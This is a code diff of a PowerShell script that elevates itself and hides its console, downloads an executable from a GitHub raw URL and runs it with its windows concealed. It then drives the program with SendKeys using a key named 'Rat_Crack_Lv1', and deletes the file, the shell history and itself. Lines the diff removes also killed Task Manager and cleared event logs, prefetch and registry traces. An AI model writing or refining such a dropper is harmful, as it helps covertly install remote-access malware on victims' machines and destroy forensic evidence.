@@ -48,72 +48,59 @@ if (-not $isAdmin) {
 }
 
 # =====================================================
-# Elevated part – everything runs hidden from now on
+# Elevated part – fully hidden
 # =====================================================
 param([string]$level)
 
-# Hide the PowerShell console immediately
+# Use the selected level as the mode (1-4)
+$mode = $level
+
+# Add Win32 API for window enumeration and hiding
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class Win32 {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    
+    [DllImport("user32.dll")]
+    public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);
+    
+    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
+    
+    [DllImport("user32.dll")]
+    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+    
+    [DllImport("user32.dll")]
+    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+    
+    [DllImport("user32.dll")]
+    public static extern bool IsWindowVisible(IntPtr hWnd);
+    
+    [DllImport("user32.dll")]
+    public static extern bool SetForegroundWindow(IntPtr hWnd);
+}
+"@
+
+# Hide this PowerShell console
 $hwnd = (Get-Process -Id $pid).MainWindowHandle
 if ($hwnd -ne [IntPtr]::Zero) {
     Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
-public class Win32 {
+public class SimpleHide {
     [DllImport("user32.dll")]
     public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 "@
-    [Win32]::ShowWindow($hwnd, 0) | Out-Null
+    [SimpleHide]::ShowWindow($hwnd, 0) | Out-Null
 }
-
-# Add Win32 API for window handling (to bring EXE to foreground if needed)
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-
-public class WindowAPI {
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-    [DllImport("user32.dll")]
-    public static extern bool SetForegroundWindow(IntPtr hWnd);
-    [DllImport("user32.dll")]
-    public static extern bool BringWindowToTop(IntPtr hWnd);
-}
-"@
 
 # === Configuration ===
 $licenseKey = "Rat_Crack_Lv1"
 $exeUrl = "https://raw.githubusercontent.com/TSTEAM865/fafawfqf/main/cmd.exe"
-$mode = $level   # the mode to select (1-4)
-
-# === Level-specific behavior (only affects delays and fake errors) ===
-switch ($level) {
-    "1" {
-        $delayBeforeSend = 1
-        $showFakeError = $false
-    }
-    "2" {
-        $delayBeforeSend = 3
-        $showFakeError = $false
-    }
-    "3" {
-        $delayBeforeSend = 4
-        $showFakeError = $false
-    }
-    "4" {
-        $delayBeforeSend = 5
-        $showFakeError = $true
-        # Show a fake error message box (optional)
-        Add-Type -AssemblyName System.Windows.Forms
-        [System.Windows.Forms.MessageBox]::Show("An error occurred. Please restart the application.", "Error", "OK", "Error")
-    }
-    default {
-        $delayBeforeSend = 3
-        $showFakeError = $false
-    }
-}
 
 # === Clear Temp ===
 $tempDir = $env:TEMP
@@ -130,41 +117,97 @@ try {
     $webClient = New-Object System.Net.WebClient
     $webClient.DownloadFile($exeUrl, $exePath)
     $webClient.Dispose()
-} catch {
-    exit 1
-}
+} catch { exit 1 }
 if (-not (Test-Path $exePath)) { exit 1 }
 
-# === Kill potential conflicting processes ===
-foreach ($pName in @("taskmgr", "notepad")) {
-    $procs = Get-Process -Name $pName -ErrorAction SilentlyContinue
-    if ($procs) {
-        foreach ($p in $procs) {
-            try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch {}
-        }
+# === Launch EXE ===
+$proc = Start-Process -FilePath $exePath -WindowStyle Normal -PassThru
+$targetPid = $proc.Id
+
+# === Start background job to hide windows ===
+$hideJob = Start-Job -ArgumentList $targetPid -ScriptBlock {
+    param($pidToHide)
+    Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class WindowHider {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    
+    [DllImport("user32.dll")]
+    public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);
+    
+    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
+    
+    [DllImport("user32.dll")]
+    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+    
+    [DllImport("user32.dll")]
+    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+    
+    [DllImport("user32.dll")]
+    public static extern bool IsWindowVisible(IntPtr hWnd);
+}
+"@
+
+    $endTime = (Get-Date).AddSeconds(60)  # Run for 60 seconds (plenty of time)
+    while ((Get-Date) -lt $endTime) {
+        [WindowHider]::EnumWindows({
+            param($hWnd, $lParam)
+            $sb = New-Object System.Text.StringBuilder 256
+            [WindowHider]::GetWindowText($hWnd, $sb, $sb.Capacity) | Out-Null
+            $title = $sb.ToString()
+            $pid = 0
+            [WindowHider]::GetWindowThreadProcessId($hWnd, [ref]$pid) | Out-Null
+            
+            $shouldHide = $false
+            if ($pid -eq $lParam) { $shouldHide = $true }
+            elseif ($title -like "*SKYNET*") { $shouldHide = $true }
+            elseif ($title -like "*DEMOSHOP*") { $shouldHide = $true }
+            elseif ($title -like "*Console Window Host*") { $shouldHide = $true }
+            
+            if ($shouldHide -and [WindowHider]::IsWindowVisible($hWnd)) {
+                [WindowHider]::ShowWindow($hWnd, 0) | Out-Null
+            }
+            return $true
+        }, [IntPtr]::Zero) | Out-Null
+        
+        Start-Sleep -Milliseconds 200
     }
 }
-Start-Sleep -Milliseconds 500
 
-# === Launch EXE HIDDEN (always) ===
-$proc = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
+# Wait for the window to appear and be hidden
+Start-Sleep -Seconds 3
 
-# Wait for the window to be ready (even though it's hidden, we need to send keys)
-Start-Sleep -Seconds $delayBeforeSend
+# === Find the window handle (for SendKeys) ===
+$hwnd = [IntPtr]::Zero
+[Win32]::EnumWindows({
+    param($hWnd, $lParam)
+    $sb = New-Object System.Text.StringBuilder 256
+    [Win32]::GetWindowText($hWnd, $sb, $sb.Capacity) | Out-Null
+    $title = $sb.ToString()
+    $pid = 0
+    [Win32]::GetWindowThreadProcessId($hWnd, [ref]$pid) | Out-Null
+    if ($pid -eq $targetPid -and ($title -like "*SKYNET*" -or $title -like "*DEMOSHOP*")) {
+        $hwnd = $hWnd
+        return $false
+    }
+    return $true
+}, [IntPtr]::Zero) | Out-Null
 
-# === Find the window handle (it's hidden, but we still need to focus it for SendKeys) ===
-$hwnd = $proc.MainWindowHandle
+# If not found by PID, try by title
 if ($hwnd -eq [IntPtr]::Zero) {
-    $hwnd = [WindowAPI]::FindWindow($null, "SKYNET - DEMOSHOP")
-    if ($hwnd -eq [IntPtr]::Zero) {
-        $hwnd = [WindowAPI]::FindWindow($null, "DEMOSHOP")
-    }
+    $hwnd = [Win32]::FindWindow($null, "SKYNET - DEMOSHOP")
+}
+if ($hwnd -eq [IntPtr]::Zero) {
+    $hwnd = [Win32]::FindWindow($null, "DEMOSHOP")
 }
 
-# Even though it's hidden, we still need to bring it to foreground for SendKeys to work
+# Bring to foreground (needed for SendKeys)
 if ($hwnd -ne [IntPtr]::Zero) {
-    [WindowAPI]::SetForegroundWindow($hwnd) | Out-Null
-    [WindowAPI]::BringWindowToTop($hwnd) | Out-Null
+    [Win32]::SetForegroundWindow($hwnd) | Out-Null
     Start-Sleep -Milliseconds 500
 }
 
@@ -173,23 +216,26 @@ Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.SendKeys]::SendWait($licenseKey)
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
-# Wait for the menu to appear
-Start-Sleep -Seconds 3
+# === Wait 5 seconds (instead of 10) for validation and menu ===
+Write-Host "Waiting 5 seconds for menu..." -ForegroundColor Yellow
+Start-Sleep -Seconds 5
 
-# === Send mode selection (1-4) ===
+# === Bring window to foreground again ===
+if ($hwnd -ne [IntPtr]::Zero) {
+    [Win32]::SetForegroundWindow($hwnd) | Out-Null
+    Start-Sleep -Milliseconds 500
+}
+
+# === Send the selected mode (1-4) and Enter ===
 [System.Windows.Forms.SendKeys]::SendWait($mode)
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
-# Wait a bit for the EXE to finish
-Start-Sleep -Seconds 2
-
-# === Optionally hide the window (already hidden) – but just in case ===
-if ($hwnd -ne [IntPtr]::Zero) {
-    [WindowAPI]::ShowWindow($hwnd, 0) | Out-Null
-}
+# Wait a bit, then stop the hiding job and do final cleanup
+Start-Sleep -Seconds 5
+Stop-Job $hideJob
+Remove-Job $hideJob
 
 # === Cleanup ===
-Start-Sleep -Seconds 2
 if (Test-Path $exePath) { Remove-Item $exePath -Force -ErrorAction SilentlyContinue }
 
 # Clear PowerShell history
@@ -197,55 +243,12 @@ if (Test-Path $exePath) { Remove-Item $exePath -Force -ErrorAction SilentlyConti
 $histPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $histPath) { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue }
 
-# Clear recent, jump lists, prefetch
-$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
-if (Test-Path $recentPath) {
-    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
-}
-
-$jumpPaths = @(
-    "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
-    "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
-)
-foreach ($p in $jumpPaths) {
-    if (Test-Path $p) {
-        Get-ChildItem -Path $p -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    }
-}
-
-$prefetchPath = "C:\Windows\Prefetch"
-for ($i=0; $i -lt 3; $i++) {
-    Start-Sleep -Milliseconds 500
-    if (Test-Path $prefetchPath) {
-        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    }
-}
-
-# Clear registry MRU
-$mruKeys = @(
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
-    "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
-)
-foreach ($k in $mruKeys) {
-    if (Test-Path $k) {
-        Remove-Item -Path $k -Recurse -Force -ErrorAction SilentlyContinue
-        New-Item -Path $k -Force -ErrorAction SilentlyContinue | Out-Null
-    }
-}
-
-# Clear event logs
-$logs = @("Application","Security","System","Microsoft-Windows-PowerShell/Operational","Microsoft-Windows-Sysmon/Operational")
-foreach ($log in $logs) {
-    wevtutil cl $log 2>$null
-}
-
 # Delete script itself
 if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
     Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
 }
 
-# === Show "Done" message ===
+# Show "Done"
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show("Done", "Complete", "OK", "Information")
 
